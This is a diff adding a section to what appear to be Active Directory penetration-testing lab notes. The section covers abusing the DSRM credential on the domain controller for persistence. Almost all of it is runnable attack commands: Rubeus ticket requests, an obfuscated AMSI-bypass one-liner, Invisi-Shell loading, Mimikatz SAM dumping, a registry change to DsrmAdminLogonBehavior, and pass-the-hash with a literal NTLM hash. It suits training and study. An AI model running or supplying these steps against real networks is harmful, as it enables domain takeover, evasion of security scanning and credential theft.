@@ -1370,3 +1370,90 @@ winrs -r:dcorp-dc cmd
 
 
 ![](https://i.imgur.com/QexYfSz.png)
+
+
+
+### **Abusing the DSRM credential for persistence.**
+
+
+**Note that we need Domain Admin privileges to do this,  So go ahead and spawn an elevated shell and run this to obtain a new `MS-DOS` session with domain admin privileges** -:
+
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+-  run the following commands on the new `MS-DOS` session to open a PowerShell remoting session
+
+```powershell
+# load invisi-shell
+powershell
+cd \AD\Tools
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+# load PS Remoting
+$sess = New-PSSession dcorp-dc
+Enter-PSSession -Session $sess
+
+# load amsi bypass
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+# Exit session
+exit
+```
+
+
+
+
+- Load the Invoke-Mimi script in the current session
+
+
+```powershell
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
+```
+
+
+
+- Extract credentials from the SAM file from the DC. **The Directory Services Restore Mode** (DSRM) password is mapped to the local **Administrator** on the DC
+
+
+```powershell
+# Connect to DC
+Enter-PSSession -Session $sess
+
+# Extract Creds
+Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
+
+# Important Output -
+# User:
+# Hash NTLM:
+```
+
+
+- change the logon behavior for the DSRM account
+
+
+```powershell
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
+exit
+```
+
+
+- Pass the Hash for the **DSRM** administrator
+
+```powershell
+ . .\Invoke-Mimi.ps1
+
+Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+
+- We can now access the `dcorp-dc` directly from the new session.
+
+
+```powershell
+ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+```
+
+
+![](https://i.imgur.com/IRluJRE.png)
